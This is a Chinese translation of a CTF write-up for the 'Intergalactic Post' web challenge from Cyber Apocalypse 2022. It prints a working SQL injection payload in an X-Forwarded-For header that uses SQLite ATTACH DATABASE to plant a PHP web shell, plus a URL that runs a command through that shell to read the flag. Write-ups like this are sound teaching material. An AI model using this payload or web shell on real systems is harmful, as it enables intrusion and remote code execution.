<html>
<head>
<title>Cyber Apocalypse CTF 2022 — Web — Intergalactic Post Write-up</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">网络启示录CTF 2022 —网络—星系际文章</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/cyber-apocalypse-ctf-2022-web-intergalactic-post-write-up-9f2b1acc5386?source=collection_archive---------2-----------------------#2022-05-19">https://infosecwriteups.com/cyber-apocalypse-ctf-2022-web-intergalactic-post-write-up-9f2b1acc5386?source=collection_archive---------2-----------------------#2022-05-19</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="dc57" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">提示:</strong></p><p id="de98" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">星际邮报<br/>最大的星际通讯机构一直在散布关于能源危机战争的错误信息。邦妮的消息来源证实几个月前有人恶意收购了这家机构，我们怀疑是金牙军在幕后操纵。尤利西斯为我们找到了他们代理服务器的潜在接入点。你能黑进他们的新闻订阅门户让我们进去吗？</p><p id="e113" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">开始:</strong></p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi kl"><img src="../Images/4ee8d4c652887b9b239af5a8280883f4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*v1l7o6c4wdwWeyYI_VZ66A.png"/></div></div></figure><p id="d9a2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是一个网络挑战，我们有应用程序的源代码，所以我们正在下载它，并在从真正的网站上获得标志之前，在我们的本地测试它。</p><p id="e83b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">首先，我们正在检查网站及其功能，</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi kx"><img src="../Images/9b81c308af937855b3a5e2ed866ce494.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*9rqFmixRqM4EWW57icetsw.png"/></div></div></figure><p id="cb37" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">它需要一封电子邮件来订阅..</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi ky"><img src="../Images/48672d39e0683820db36778b3e2c3d02.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*wENFZddNbOX7FpARj4rJEg.png"/></div></div></figure><p id="4df7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">当我们输入电子邮件格式时，它会接受。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi ky"><img src="../Images/b4c8fb2fd822851d844578a2c321195a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*5tLs_kHx1uHmwHnXmuKwcg.png"/></div></div></figure><p id="36c6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">但是当我们给出另一种格式如test '时，它不接受。</p><p id="bcce" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们检查源代码，它对我们的输入做了什么，以及如何过滤它。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi kz"><img src="../Images/61496ba610c0bd9d35f81c2d1ff07942.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*dHGeuGb7Zv5jx78qy3pWwA.png"/></div></div></figure><p id="0940" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">当我检查它时，它使用filter_var函数来检查它是否是电子邮件格式。</p><div class="la lb gp gr lc ld"><a href="https://www.w3schools.com/php/func_filter_var.asp" rel="noopener  ugc nofollow" target="_blank"><div class="le ab fo"><div class="lf ab lg cl cj lh"><h2 class="bd ir gy z fp li fr fs lj fu fw ip bi translated">函数的作用</h2><div class="lk l"><h3 class="bd b gy z fp li fr fs lj fu fw dk translated">W3Schools提供所有主要网络语言的免费在线教程、参考资料和练习。覆盖…</h3></div><div class="ll l"><p class="bd b dl z fp li fr fs lj fu fw dk translated">www.w3schools.com</p></div></div><div class="lm l"><div class="ln l lo lp lq lm lr kv ld"/></div></div></a></div><p id="0fa3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我还研究了这个函数是否有sql注入，因为正如您在下图中看到的，它将我们的电子邮件写入数据库。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi ls"><img src="../Images/1f1c18eb3eec177499187a73b17e2b1b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*JURRRvtAyOHGWB-X6BuPkg.png"/></div></div></figure><p id="5ad7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我找到了下面的链接。</p><div class="la lb gp gr lc ld"><a href="https://github.com/Xib3rR4dAr/filter-var-sqli" rel="noopener  ugc nofollow" target="_blank"><div class="le ab fo"><div class="lf ab lg cl cj lh"><h2 class="bd ir gy z fp li fr fs lj fu fw ip bi translated">GitHub-xib 3 r 4 Dar/FILTER-var-sqli:绕过FILTER _ SANITIZE _ EMAIL &amp; FILTER _ VALIDATE _ EMAIL…</h2><div class="lk l"><h3 class="bd b gy z fp li fr fs lj fu fw dk translated">故事:在测试一个网站的时候，我碰到了它的管理面板，并且无法登录。常见的SQLi登录绕过…</h3></div><div class="ll l"><p class="bd b dl z fp li fr fs lj fu fw dk translated">github.com</p></div></div><div class="lm l"><div class="lt l lo lp lq lm lr kv ld"/></div></div></a></div><p id="0880" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">但是此链接可以帮助sqli绕过电子邮件格式的登录。所以为了确保万无一失，我编辑了代码，因为没有filter_var函数，我用sqlmap进行攻击。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi lu"><img src="../Images/c639139f0cde7d8c9a56c89fa829c284.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*a6nTOIOxtvUXR6xbAezqDg.png"/></div></div></figure><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi lv"><img src="../Images/e60bbc7d5dd783497cffe993cb9458d6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*HNysg2_1cV11j6K56Fcixg.png"/></div></div></figure><p id="ad2c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">是的，我可以得到桌子等等。</p><p id="cdbb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">但另一件事，我发现，它也获得我们的ip地址，并将其写入数据库，它没有任何过滤功能。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi lw"><img src="../Images/4ba296d9e4731223c1edfe26355808e4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*9PTaurS8ujONrHCpLkCsCQ.png"/></div></div></figure><p id="9aa5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因此，我们可以添加报头来发送我们的ip地址。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi ky"><img src="../Images/c3196e9be1d28c5b9cf0bdb5dbeb4fa3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*s1fzR6dzpMwft096C8fsoA.png"/></div></div></figure><p id="58df" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">你可以检查以下网站的有效载荷。</p><p id="7bfd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><a class="ae lx" href="http://atta.cked.me/home/sqlite3injectioncheatsheet" rel="noopener ugc nofollow" target="_blank">http://atta.cked.me/home/sqlite3injectioncheatsheet</a></p><p id="0341" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们使用这个标题</p><pre class="km kn ko kp gt ly lz ma mb aw mc bi"><span id="31f3" class="md me iq lz b gy mf mg l mh mi">X-Forwarded-For: blahblah','blahblah');ATTACH DATABASE '/www/lol.php' as lol;CREATE TABLE lol.pwn(dataz text); INSERT INTO lol.pwn (dataz) VALUES ("&lt;?php system($_GET['cmd']); ?&gt;");--</span></pre><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi mj"><img src="../Images/a9840b9ae15218cd4191effbf5f76236.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*cQ6kMhdAJ5NztTnw36NDvA.png"/></div></div></figure><p id="4927" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">它接受它，因为它是有效的电子邮件，但它不检查ip地址的格式是否正确。</p><p id="e2fd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后我们在/lol.php有一个web shell，可以做</p><pre class="km kn ko kp gt ly lz ma mb aw mc bi"><span id="59b2" class="md me iq lz b gy mf mg l mh mi"><a class="ae lx" href="http://206.189.126.144:31604/lol.php?cmd=cat%20/flag*" rel="noopener ugc nofollow" target="_blank">http://206.189.126.144:31604/lol.php?cmd=cat%20/flag*</a></span></pre><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi ky"><img src="../Images/377d0fea3e082158a0eebe3f6b84b53d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*5hpoDObWk_srBM3G6gf_qA.png"/></div></div></figure></div></div>    
</body>
</html>